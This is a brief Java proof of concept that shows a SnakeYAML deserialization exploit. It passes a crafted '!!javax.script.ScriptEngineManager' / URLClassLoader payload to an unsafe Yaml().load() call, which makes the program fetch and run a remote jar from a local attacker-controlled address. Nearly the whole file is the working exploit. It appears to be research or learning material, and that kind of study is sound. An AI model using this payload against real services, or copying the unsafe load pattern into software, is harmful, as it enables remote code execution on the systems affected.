package com.yyjccc.yaml;

import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.constructor.SafeConstructor;

public class Main {
	public static void main(String[] args) {
		String context = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://127.0.0.1:7788/exp.jar\"]]]]\n";
		Yaml yaml = new Yaml();
		yaml.load(context);
	}
}
